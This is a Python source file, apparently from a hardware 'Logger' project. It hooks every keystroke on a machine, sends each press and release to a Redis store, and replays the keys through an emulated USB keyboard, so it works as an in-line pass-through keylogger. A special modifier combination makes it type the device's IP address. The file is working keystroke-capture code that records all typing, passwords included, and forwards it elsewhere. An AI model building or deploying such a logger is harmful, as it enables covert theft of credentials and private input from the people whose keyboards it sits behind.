import keyboard
from zero_hid import Keyboard
from Logger.utils.converter import isModifier, getKeyCode
from Logger.utils.mapping import ShowIPOnKeyCode
from Logger.utils.redis_worker import send
from Logger.utils.getIP import getIP

# Set of currently applied modifier keys such as Shift, Ctrl etc.
current_applied_modifier = set()

def event_hook(event):
    # Hook to intercept keyboard events
    with Keyboard() as k:
        # Get the keycode corresponding to the scan code of the event
        keycode = getKeyCode(event.scan_code)

        # Check if the event type is key down event
        if event.event_type == keyboard.KEY_DOWN:
            # Send the key down action to Redis
            send({'action':'PRESS', 'scan_code':event.scan_code})

            # If the event is for a modifier key
            if isModifier(event.scan_code):
                # Add the modifier key to the current applied modifier set
                current_applied_modifier.add(keycode)

                # Check if the current modifier combination is the one to display the IP
                if current_applied_modifier == ShowIPOnKeyCode:
                    # Emulate typing the IP address as keyboard input
                    k.type(getIP())
            else:
                # Emulate key press without release for non-modifier keys
                k.press(list(current_applied_modifier), keycode, release=False)
        else:
            # Send the key release action to Redis
            send({'action':'RELEASE', 'scan_code':event.scan_code})
            
            # If the event is for a modifier key
            if isModifier(event.scan_code):
                # Remove the modifier key from the current applied modifier set
                current_applied_modifier.remove(keycode)
            else:
                # Emulate key release for non-modifier keys
                k.release()

def start():
    # Start hooking all keyboard events through the event_hook function
    keyboard.hook(event_hook)

    # Wait indefinitely until an exit condition is met
    keyboard.wait()

if __name__ == '__main__':
    start()